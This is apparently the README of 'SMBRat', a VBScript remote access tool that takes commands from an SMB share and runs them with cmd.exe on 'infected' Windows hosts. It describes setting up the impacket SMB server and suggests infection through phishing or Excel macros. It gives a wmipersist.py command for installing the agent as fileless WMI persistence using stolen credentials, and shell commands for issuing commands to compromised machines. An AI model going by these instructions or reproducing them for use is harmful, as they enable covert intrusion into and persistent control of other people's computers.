# SMBRat
A Windows Remote Administration Tool in Visual Basic


## Ingredients

### Handler

The `handler` needs an SMB Server to work. The `smbserver.py` module from [*Core Security's* `impacket`](https://github.com/coresecurity/impacket) package will do.

Most probably `smbd` would also do the trick, but it hasn't been tested yet.

#### Setting up the SMBServer

A share with name `D$` is needed, to look like a legit Windows host's SMB.

```bash
(impacket) root@Deskjet-4540:/home/unused/Tools/RATs/SMBRat# mkdir Share
(impacket) root@Deskjet-4540:/home/unused/Tools/RATs/SMBRat# smbserver.py -comment "My Share" "D$" Share/
Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

### Agent

The `agent` is a *Visual Basic Script* that runs on the infected host and connects to the *SMB Server*. It creates a folder in there named after the host's `hostname` and primary `MAC` address (trying to be *unique* and *informative* at the same time for reporting purposes).
It does **NOT** use a drive letter to *Mount* the Share, just uses `UNC paths` to directly read remote files.
It also injects the `UNC path` into the `%PATH%` variable of its execution environment.

#### Agent's Execution

The `agent` is configured to **run once**. **Statelessly**.
It looks for a file named `exec.dat` in the folder it created in the *SMB Share*
If it finds the file, it **reads its content** and executes it as a command with `cmd.exe /c <command>` like a *semi-interactive shell*.
The command's response is stored in `output.dat` (next to `exec.dat`). 
Then deletes the `exec.dat` file.



## Infection Scheme

A *While loop* can be added to the `agent.vbs`  file's beginning, with a delay statement of multiple seconds (10 secs is ideal), and it will be able to infect windows hosts by *double clicking* / *phishing* / *excel macros* / etc...

Yet, if a Windows host has *RPC* enabled, it is possible to install the *VBS* file as *fileless malware* through `WMI` and the fabulous `impacket` package with a command like:
```bash
(impacket) unused@Deskjet-4540:~/Tools/RATs/SMBRat$ wmipersist.py '<username>:<password>@<hostname/ipaddress>' install -vbs agent.vbs -name smbrat -timer 10
```  

It is also possible to utilize the `WMI` tool by local access to install the `agent.vbs`





## Usage

At time of writing, no `Handler` shell is implemented, so usage can be done by just using a command like `watch` to inspect the `output.dat` file:

```bash
$ watch -n0.2 cat Share/projectName/DESKTOP-XXXXXXX-AA\:BB\:CC\:DD\:EE\:FF/output.dat
```
and `echo` to write stuff to the `exec.dat` file:
```bash
$ echo 'whoami /all' > Share/projectName/DESKTOP-XXXXXXX-AA\:BB\:CC\:DD\:EE\:FF/exec.dat
```

Yet, in the near future, a Python CLI will be implememted to automate the above tasks and also contain:

* Command History
* Output History (will make reporting a lot easier)
* File Download



